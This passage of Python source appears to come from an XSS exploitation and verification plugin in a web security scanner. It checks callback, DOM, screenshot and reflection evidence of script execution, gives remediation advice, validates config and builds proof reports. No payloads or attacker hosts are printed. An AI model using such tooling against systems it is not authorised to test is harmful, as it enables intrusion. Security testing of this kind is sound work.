                proof_lines.append(f"  - Timestamp: {callback_data.get('timestamp', 'N/A')}")
                if callback_data.get('user_agent'):
                    proof_lines.append(f"  - User Agent: {callback_data['user_agent'][:80]}")
            
            proof_lines.append("")
            proof_lines.append("Impact: JavaScript execution in victim's browser")
            
            return True, '\n'.join(proof_lines)
        
        # Check for DOM-based verification
        dom_evidence = result.get('dom_evidence')
        if dom_evidence and isinstance(dom_evidence, dict):
            if dom_evidence.get('alert_triggered') or dom_evidence.get('console_logs'):
                payload_used = result.get('payload', 'unknown')
                
                proof_lines = [
                    "✓ VERIFIED - Cross-Site Scripting (XSS)",
                    "",
                    "Verification Method: DOM-based (Browser Automation)",
                    f"Payload: {payload_used[:100]}",
                    ""
                ]
                
                if dom_evidence.get('alert_triggered'):
                    proof_lines.append("Evidence: Alert dialog triggered in browser")
                
                if dom_evidence.get('console_logs'):
                    proof_lines.append("Console Logs:")
                    for log in dom_evidence['console_logs'][:5]:
                        proof_lines.append(f"  - {str(log)[:80]}")
                
                if dom_evidence.get('screenshot'):
                    proof_lines.append("")
                    proof_lines.append("Visual Proof: Screenshot captured")
                
                proof_lines.append("")
                proof_lines.append("Impact: JavaScript execution in browser context")
                
                return True, '\n'.join(proof_lines)
        
        # Check for visual proof (GIF capture)
        if result.get('visual_proofs'):
            visual_proofs = result.get('visual_proofs', [])
            if len(visual_proofs) > 0:
                payload_used = result.get('payload', 'unknown')
                
                proof_lines = [
                    "✓ VERIFIED - Cross-Site Scripting (XSS)",
                    "",
                    "Verification Method: Visual Proof (Animated GIF)",
                    f"Payload: {payload_used[:100]}",
                    f"Visual Proofs Captured: {len(visual_proofs)}",
                    "",
                    "Impact: JavaScript execution captured visually"
                ]
                
                return True, '\n'.join(proof_lines)
        
        # Check if payload was reflected (weak proof, not fully verified)
        evidence = result.get('evidence', '')
        if 'reflected' in evidence.lower() or 'injected' in evidence.lower():
            # Reflected but not verified execution - partial proof only
            return False, f"Payload reflected but execution not verified: {evidence[:200]}"
        
        # Success claimed but no concrete proof
        return False, None
    
    def get_remediation_advice(self) -> str:
        """Return remediation advice for XSS."""
        return """
XSS Remediation Advice:

1. Input Validation:
   - Validate all user inputs on the server side
   - Use whitelist validation where possible
   - Reject inputs containing script tags or event handlers

2. Output Encoding:
   - Always encode output before rendering in HTML
   - Use context-appropriate encoding (HTML, JavaScript, URL, CSS)
   - Use security libraries for encoding (e.g., OWASP ESAPI)

3. Content Security Policy (CSP):
   - Implement a strict Content Security Policy
   - Use nonces or hashes for inline scripts
   - Disable unsafe-inline and unsafe-eval

4. HTTPOnly and Secure Cookies:
   - Set HTTPOnly flag on sensitive cookies
   - Use Secure flag for HTTPS connections
   - Implement SameSite cookie attribute

5. Framework Security Features:
   - Use template engines with auto-escaping
   - Enable XSS protection in your framework
   - Keep frameworks and libraries up to date

6. DOM Security:
   - Avoid using dangerous JavaScript functions (eval, innerHTML)
   - Use safe DOM manipulation methods (textContent, setAttribute)
   - Sanitize data before inserting into the DOM

7. Web Application Firewall (WAF):
   - Deploy a WAF to filter XSS attempts
   - Keep WAF rules updated
   - Monitor and analyze WAF logs

8. Security Headers:
   - Implement X-XSS-Protection header
   - Use X-Content-Type-Options: nosniff
   - Set X-Frame-Options for clickjacking protection

9. Regular Security Testing:
   - Perform regular security assessments
   - Use automated scanning tools
   - Conduct manual penetration testing
   - Implement secure code review process
        """
    
    def get_severity_level(self) -> str:
        """Return severity level for XSS."""
        return 'high'
    
    def validate_config(self, config: Dict[str, Any]) -> bool:
        """
        Validate the configuration for this plugin.
        
        Args:
            config: Configuration dictionary
        
        Returns:
            True if configuration is valid, False otherwise
        """
        # Check for valid crawl depth
        if 'crawl_depth' in config:
            if not isinstance(config['crawl_depth'], int) or config['crawl_depth'] < 0:
                logger.error("Invalid crawl_depth value in config")
                return False
        
        # Check for valid max_pages
        if 'max_pages' in config:
            if not isinstance(config['max_pages'], int) or config['max_pages'] <= 0:
                logger.error("Invalid max_pages value in config")
                return False
        
        # Check for valid timeout
        if 'timeout' in config:
            if not isinstance(config['timeout'], (int, float)) or config['timeout'] <= 0:
                logger.error("Invalid timeout value in config")
                return False
        
        # Check for valid network_throttle
        if 'network_throttle' in config:
            if not isinstance(config['network_throttle'], (int, float)) or config['network_throttle'] < 0:
                logger.error("Invalid network_throttle value in config")
                return False
        
        # Check for valid browser_type
        if 'browser_type' in config:
            if config['browser_type'] not in ['chrome', 'firefox']:
                logger.error("Invalid browser_type value in config")
                return False
        
        # Check for valid output_format
        if 'output_format' in config:
            if config['output_format'] not in ['json', 'html', 'markdown', 'md', 'both', 'all']:
                logger.error("Invalid output_format value in config")
                return False
        
        return True
    
    def _generate_proof_report(self, result: Dict[str, Any], target_url: str,
                               vulnerability_data: Dict[str, Any], config: Dict[str, Any]) -> None:
        """
        Generate unified proof report using ProofReporter.
        
        Args:
            result: Exploitation result dictionary
            target_url: Target URL
            vulnerability_data: Vulnerability data
            config: Configuration dictionary
        """
        try:
            from scanner.proof_reporter import get_proof_reporter
            
            # Initialize proof reporter
            reporter = get_proof_reporter(
                enable_visual_proof=config.get('enable_visual_proof', True)
            )
            
            # Create proof data container
            vuln_id = vulnerability_data.get('vulnerability_id')
            proof_data = reporter.create_proof_data('xss', vuln_id)
            
            # Set success status
            verified = result.get('success', False) and len(result.get('findings', [])) > 0
            proof_data.set_success(
                success=result.get('success', False),
                verified=verified,
                confidence=0.8 if verified else 0.3
            )
            
            # Add HTTP traffic from findings
            for finding in result.get('findings', []):
                if 'request' in finding:
                    req = finding['request']
                    proof_data.add_http_request(
                        method=req.get('method', 'GET'),
                        url=req.get('url', target_url),
                        headers=req.get('headers', {}),
                        body=req.get('body')
                    )
                
                if 'response' in finding:
                    resp = finding['response']
                    proof_data.add_http_response(
                        status_code=resp.get('status_code', 200),
                        headers=resp.get('headers', {}),
                        body=resp.get('body')
                    )
            
            # Add exploitation logs
            if result.get('evidence'):
                proof_data.add_log(result['evidence'], 'info')
            
            # Add extracted data
            if result.get('data'):
                proof_data.set_extracted_data(result['data'])
            
            # Add callback evidence if available
            if self.callback_verifier:
                for finding in result.get('findings', []):
                    if finding.get('callback_verified'):
                        proof_data.add_callback_evidence({
                            'callback_id': finding.get('callback_id'),
                            'callback_data': finding.get('callback_data'),
                            'verified': True
                        })
            
            # Capture visual proof if successful and enabled
            if verified and config.get('enable_visual_proof', True):
                # Try to capture visual proof for first successful finding
                for finding in result.get('findings', [])[:1]:  # Only first finding
                    exploit_url = finding.get('exploit_url', target_url)
                    try:
                        capture_type = config.get('visual_proof_type', 'screenshot')
                        reporter.capture_visual_proof(
                            proof_data,
                            exploit_url,
                            capture_type=capture_type,
                            duration=3.0
                        )
                        proof_data.add_log(f"Visual proof captured for {exploit_url}", 'info')
                    except Exception as e:
                        proof_data.add_log(f"Visual proof capture failed: {e}", 'warning')
            
            # Add metadata
            proof_data.add_metadata('target_url', target_url)
            proof_data.add_metadata('total_findings', len(result.get('findings', [])))
            proof_data.add_metadata('plugin_version', self.version)
            
            # Generate and save proof reports
            proof_results = reporter.report_proof(
                proof_data,
                save_json=config.get('save_proof_json', True),
                save_html=config.get('save_proof_html', True),
                store_db=config.get('store_proof_db', True),
                vulnerability_model=vulnerability_data.get('vulnerability_model')
            )
            
            # Add proof paths to result
            result['proof_json_path'] = proof_results.get('json_path')
            result['proof_html_path'] = proof_results.get('html_path')
            result['proof_db_stored'] = proof_results.get('db_stored')
            
            logger.info("XSS proof reporting completed successfully")
            
        except ImportError:
            logger.warning("ProofReporter not available, skipping proof generation")
        except Exception as e:
            logger.error(f"Error generating proof report: {e}", exc_info=True)
    
    def get_required_config_keys(self) -> List[str]:
        """Return list of required configuration keys."""
        # All configuration is optional with sensible defaults
        return []
